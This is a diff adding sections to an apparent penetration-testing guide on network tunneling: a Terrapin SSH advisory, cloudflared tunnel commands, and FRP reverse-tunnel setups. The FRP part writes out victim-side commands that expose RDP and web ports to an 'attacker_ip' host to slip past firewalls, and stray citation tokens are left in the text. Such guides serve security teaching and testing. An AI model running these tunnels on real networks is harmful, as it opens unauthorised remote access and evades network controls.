@@ -105,6 +105,10 @@ Set a new route on the client side
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 
+> [!NOTE]
+> **Security – Terrapin Attack (CVE-2023-48795)**  
+> The 2023 Terrapin downgrade attack can let a man-in-the-middle tamper with the early SSH handshake and inject data into **any forwarded channel** ( `-L`, `-R`, `-D` ). Ensure both client and server are patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) or explicitly disable the vulnerable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com` algorithms in `sshd_config`/`ssh_config` before relying on SSH tunnels. citeturn4search0
+
 ## SSHUTTLE
 
 You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
@@ -644,6 +648,83 @@ tunnels:
     proto: http
     addr: file:///tmp/httpbin/
 ```
+
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare’s `cloudflared` daemon can create outbound tunnels that expose **local TCP/UDP services** without requiring inbound firewall rules, using Cloudflare’s edge as the rendez-vous point. This is very handy when the egress firewall only allows HTTPS traffic but inbound connections are blocked.
+
+### Quick tunnel one-liner
+
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+
+### SOCKS5 pivot
+
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+
+### Persistent tunnels with DNS
+
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+
+Start the connector:
+
+```bash
+cloudflared tunnel run mytunnel
+```
+
+Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) is an actively-maintained Go reverse-proxy that supports **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Starting with **v0.53.0 (May 2024)** it can act as an **SSH Tunnel Gateway**, so a target host can spin up a reverse tunnel using only the stock OpenSSH client – no extra binary required.
+
+### Classic reverse TCP tunnel
+
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+
+### Using the new SSH gateway (no frpc binary)
+
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+
+The above command publishes the victim’s port **8080** as **attacker_ip:9000** without deploying any additional tooling – ideal for living-off-the-land pivoting. citeturn2search1
 
 ## Other tools to check
 
